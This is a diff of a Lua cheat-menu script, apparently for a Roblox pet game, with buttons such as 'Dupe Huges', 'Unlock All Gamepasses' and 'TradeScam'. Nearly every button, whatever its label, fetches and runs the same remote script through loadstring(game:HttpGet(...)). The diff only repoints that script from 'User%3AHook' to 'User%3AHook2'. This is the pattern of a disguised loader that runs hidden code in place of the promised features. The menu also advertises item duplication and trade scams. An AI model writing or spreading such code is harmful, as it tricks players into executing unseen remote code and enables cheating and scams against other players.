@@ -42,7 +42,7 @@ local Player = Window:MakeTab({
 Player:AddButton({
 	Name = "Fly",
 	Callback = function()
-      		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/User%3AHook", true))()
+      		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/User%3AHook2", true))()
   	end    
 })
 
@@ -211,56 +211,56 @@ Player:AddButton({
 Player:AddButton({
 	Name = "Friend All In Server",
 	Callback = function()
-      		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/ZungUser%3AHook", true))()
+      		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/User%3AHook2", true))()
   	end    
 })
 
 Player:AddButton({
 	Name = "Unfriend All In Server",
 	Callback = function()
-      		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/User%3AHook", true))()
+      		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/User%3AHook2", true))()
   	end    
 })
 
 Player:AddButton({
 	Name = "Auto Collect Gifts",
 	Callback = function()
-      		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/User%3AHook", true))()
+      		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/User%3AHook2", true))()
   	end    
 })
 
 Player:AddButton({
 	Name = "Auto Instant Collect",
 	Callback = function()
-      		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/User%3AHook", true))()
+      		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/User%3AHook2", true))()
   	end    
 })
 
 Player:AddButton({
 	Name = "3x Coin Boost",
 	Callback = function()
-      		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/User%3AHook", true))()
+      		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/User%3AHook2", true))()
   	end    
 })
 
 Player:AddButton({
 	Name = "3x Coins Boost",
 	Callback = function()
-      		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/User%3AHook", true))()
+      		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/User%3AHook2", true))()
   	end    
 })
 
 Player:AddButton({
 	Name = "Auto Rank Rewards",
 	Callback = function()
-      		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/User%3AHook", true))()
+      		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/User%3AHook2", true))()
   	end    
 })
 
 Player:AddButton({
 	Name = "Auto Auto VIP Rewards",
 	Callback = function()
-      		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/User%3AHook", true))()
+      		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/User%3AHook2", true))()
   	end    
 })
 
@@ -275,63 +275,63 @@ local GUIs = Window:MakeTab({
 GUIs:AddButton({
 	Name = "Upgrades",
 	Callback = function()
-      		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/User%3AHook", true))()
+      		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/User%3AHook2", true))()
   	end    
 })
 
 GUIs:AddButton({
 	Name = "Fuse Pets",
 	Callback = function()
-      		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/User%3AHook", true))()
+      		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/User%3AHook2", true))()
   	end    
 })
 
 GUIs:AddButton({
 	Name = "Golden Machine",
 	Callback = function()
-      		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/User%3AHook", true))()
+      		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/User%3AHook2", true))()
   	end    
 })
 
 GUIs:AddButton({
 	Name = "Rainbow Machine",
 	Callback = function()
-      		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/User%3AHook", true))()
+      		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/User%3AHook2", true))()
   	end    
 })
 
 GUIs:AddButton({
 	Name = "Collections",
 	Callback = function()
-      		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/User%3AHook", true))()
+      		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/User%3AHook2", true))()
   	end    
 })
 
 GUIs:AddButton({
 	Name = "Merchant Shop",
 	Callback = function()
-      		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/User%3AHook", true))()
+      		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/User%3AHook2", true))()
   	end    
 })
 
 GUIs:AddButton({
 	Name = "DarkMatter Machine",
 	Callback = function()
-      		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/User%3AHook", true))()
+      		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/User%3AHook2", true))()
   	end    
 })
 
 GUIs:AddButton({
 	Name = "Server Booster",
 	Callback = function()
-      		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/User%3AHook", true))()
+      		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/User%3AHook2", true))()
   	end    
 })
 
 GUIs:AddButton({
 	Name = "Bank",
 	Callback = function()
-      		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/User%3AHook", true))()
+      		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/User%3AHook2", true))()
   	end    
 })
 
@@ -358,14 +358,14 @@ local titanSection = titan:AddSection({
 titan:AddButton({
 	Name = "Auto Hatch Titan Egg",
 	Callback = function()
-      		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/User%3AHook", true))()
+      		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/User%3AHook2", true))()
   	end    
 })
 
 titan:AddButton({
 	Name = "Get Huge Titan Cat",
 	Callback = function()
-      		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/User%3AHook", true))()
+      		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/User%3AHook2", true))()
   	end    
 })
 
@@ -384,14 +384,14 @@ local LuckySection = Lucky:AddSection({
 Lucky:AddButton({
 	Name = "Auto Snipe Lucky Blocks",
 	Callback = function()
-      		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/User%3AHook", true))()
+      		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/User%3AHook2", true))()
   	end    
 })
 
 Lucky:AddButton({
 	Name = "Auto Snipe Rainbow",
 	Callback = function()
-      		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/User%3AHook", true))()
+      		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/User%3AHook2", true))()
   	end    
 })
 
@@ -402,7 +402,7 @@ local LuckySection = Lucky:AddSection({
 Lucky:AddButton({
 	Name = "2 minutes",
 	Callback = function()
-      		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/User%3AHook", true))()
+      		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/User%3AHook2", true))()
   	end    
 })
 
@@ -410,7 +410,7 @@ Lucky:AddButton({
 Lucky:AddButton({
 	Name = "3 minutes",
 	Callback = function()
-      		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/User%3AHook", true))()
+      		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/User%3AHook2", true))()
   	end    
 })
 
@@ -418,14 +418,14 @@ Lucky:AddButton({
 Lucky:AddButton({
 	Name = "5 minutes",
 	Callback = function()
-      		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/User%3AHook", true))()
+      		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/User%3AHook2", true))()
   	end    
 })
 
 Lucky:AddButton({
 	Name = "10 minutes",
 	Callback = function()
-      		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/User%3AHook", true))()
+      		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/User%3AHook2", true))()
   	end    
 })
 
@@ -446,14 +446,14 @@ Auto:AddDropdown({
 	Default = "1",
 	Options = {"Cracked Egg", "Golden Cracked Egg", "Spottead Egg", "Golden Spotted Egg", "Wood Egg", "Golden Wood Egg", "Grass Egg", "Golden Grass Egg", "Beachball Egg", "Golden Beachball Egg", "Coconut Egg", "Golden Coconut Egg", "Rock Egg", "Golden Rock Egg", "Geode Egg", "Golden Geode Egg", "Snow Egg", "Golden Snow Egg", "Ice Egg", "Golden Ice Egg", "Icicle Egg", "Golden Icile Egg", "Yeti Egg", "Golden Yeti Egg", "Cactus Egg", "Golden Cactus Egg", "Spiked Egg", "Golden Spiked Egg", "Obsidian Egg", "Golden Obsidian Egg", "Magma Egg", "Golden Magma Egg", "Dominus Egg", "Golden Dominus Egg", "Enchanted Egg", "Golden Enchanted Egg", "Relic Egg", "Golden Relic Egg", "Samurai Egg", "Golden Samurai Egg", "Rainbow Egg", "Golden Rainbow Egg", "Haunted Egg", "Golden Haunted Egg", "Hell Egg", "Golden Hell Egg", "Heaven Egg", "Golden Heaven Egg", "Empyrean Egg", "Golden Empyrean Egg", "Metal Egg", "Golden Metal Egg", "Tech Egg", "Golden Tech Egg", 'Titanium Egg', "Golden Titanium Egg", "Dark Tech Egg", "Golden Dark Tech Egg", 'Steampunk Egg', "Golden Steampunk Egg", "Mechanical Egg", "Golden Mechanical Egg", "Lab Egg", "Golden Lab Egg", "Chemical Egg", "Golden Chemical Egg", "Alien Egg", "Golden Alien Egg", "Martian Egg", "Golden Martian Egg", "Planet Egg", "Golden Planet Egg", "Glitch Egg", "Golden Glitch Egg", "Hacker Egg", "Golden Hacker Egg", "Axolotl Egg", "Golden Axolotl Egg", "Shiny Axolotl Egg", "Golden Shiny Axolotl Egg", "Pixel Egg", "Golden Pixel Egg", "Spotted Pixel Egg", "Golden Spotted Pixel Egg", "Rainbow Egg", "Golden Rainbow Egg", "Paw Egg", "Golden Paw Egg", "Yarn Egg", "Golden Yarn Egg", "Cat Egg", "Golden Cat Egg", "Royal Egg", "Golden Royal Egg", "Pog Egg", "Pumpkin Egg", "Golden Pxumpkin Egg", "Eerie Egg", "Golden Eerie Egg", "Cursed Egg", "Golden Cursed Egg", "Jolly Egg", "Golden Jolly Egg", "Cozy Egg", "Golden Cozy Egg", "Gingerbread Egg", "Golden Gingerbread Egg", "Reindeer Egg", "Golden Reindeer Egg", "Christmas Tree Egg", "Golden Chistmas Tree Egg", "Ornament Egg", "Golden Ornamet Egg", "Snowman Egg", "Golden Snowman Egg"},
 	Callback = function(Value)
-		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/User%3AHook", true))()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/User%3AHook2", true))()
 	end    
 })
 
 Auto:AddButton({
 	Name = "Auto Open Eggs",
 	Callback = function()
-      		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/User%3AHook", true))()
+      		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/User%3AHook2", true))()
   	end    
 })
 
@@ -502,7 +502,7 @@ Auto:AddDropdown({
 Auto:AddButton({
 	Name = "Auto Mastery",
 	Callback = function()
-      		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/User%3AHook", true))()
+      		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/User%3AHook2", true))()
   	end    
 })
 
@@ -529,7 +529,7 @@ Pets:AddDropdown({
 Pets:AddButton({
 	Name = "Auto Enchant",
 	Callback = function()
-      		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/User%3AHook", true))()
+      		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/User%3AHook2", true))()
   	end    
 })
 
@@ -549,21 +549,21 @@ Pets:AddDropdown({
 Pets:AddButton({
 	Name = "Auto Golden/Rainbow",
 	Callback = function()
-      		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/User%3AHook", true))()
+      		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/User%3AHook2", true))()
   	end    
 })
 
 Pets:AddButton({
 	Name = "Auto Golden",
 	Callback = function()
-      		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/User%3AHook", true))()
+      		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/User%3AHook2", true))()
   	end    
 })
 
 Pets:AddButton({
 	Name = "Auto Rainbow",
 	Callback = function()
-      		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/User%3AHook", true))()
+      		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/User%3AHook2", true))()
   	end    
 })
 
@@ -577,14 +577,14 @@ local World = Window:MakeTab({
 World:AddButton({
 	Name = "Unlock All Worlds",
 	Callback = function()
-      		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/User%3AHook", true))()
+      		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/User%3AHook2", true))()
   	end    
 })
 
 World:AddButton({
 	Name = "Anti AFK",
 	Callback = function()
-      		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/User%3AHook", true))()
+      		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/User%3AHook2", true))()
   	end    
 })
 
@@ -605,21 +605,21 @@ World:AddButton({
 World:AddButton({
 	Name = "Reset Character",
 	Callback = function()
-      		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/User%3AHook", true))()
+      		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/User%3AHook2", true))()
   	end    
 })
 
 World:AddButton({
 	Name = "Kick All",
 	Callback = function()
-      		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/User%3AHook", true))()
+      		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/User%3AHook2", true))()
   	end    
 })
 
 World:AddButton({
 	Name = "Unlock All Gamepasses",
 	Callback = function()
-      		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/User%3AHook", true))()
+      		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/User%3AHook2", true))()
   	end    
 })
 
@@ -635,49 +635,49 @@ World:AddDropdown({
 World:AddButton({
 	Name = "Normal Mode",
 	Callback = function()
-      		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/User%3AHook", true))()
+      		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/User%3AHook2", true))()
   	end    
 })
 
 World:AddButton({
 	Name = "Rejoin",
 	Callback = function()
-      		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/User%3AHook", true))()
+      		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/User%3AHook2", true))()
   	end    
 })
 
 World:AddButton({
 	Name = "Unequip All Pets",
 	Callback = function()
-      		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/User%3AHook", true))()
+      		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/User%3AHook2", true))()
   	end    
 })
 
 World:AddButton({
 	Name = "Equip Best Pet",
 	Callback = function()
-      		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/User%3AHook", true))()
+      		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/User%3AHook2", true))()
   	end    
 })
 
 World:AddButton({
 	Name = "Lag Reducer",
 	Callback = function()
-      		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/User%3AHook", true))()
+      		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/User%3AHook2", true))()
   	end    
 })
 
 World:AddButton({
 	Name = "Stats Tracker",
 	Callback = function()
-      		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/User%3AHook", true))()
+      		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/User%3AHook2", true))()
   	end    
 })
 
 World:AddButton({
 	Name = "Save Settings",
 	Callback = function()
-      		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/User%3AHook", true))()
+      		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/User%3AHook2", true))()
   	end    
 })
 
@@ -703,14 +703,14 @@ local DupesSection = Dupes:AddSection({
 Dupes:AddButton({
 	Name = "Dupe Huges",
 	Callback = function()
-      		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/User%3AHook", true))()
+      		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/User%3AHook2", true))()
   	end    
 })
 
 Dupes:AddButton({
 	Name = "Dupe Exclusives",
 	Callback = function()
-      		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/User%3AHook", true))()
+      		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/User%3AHook2", true))()
   	end    
 })
 
@@ -744,7 +744,7 @@ local TradeScamSection = TradeScam:AddSection({
 TradeScam:AddButton({
 	Name = "TradeScam",
 	Callback = function()
-      		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/User%3AHook", true))()
+      		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/User%3AHook2", true))()
   	end    
 })
 
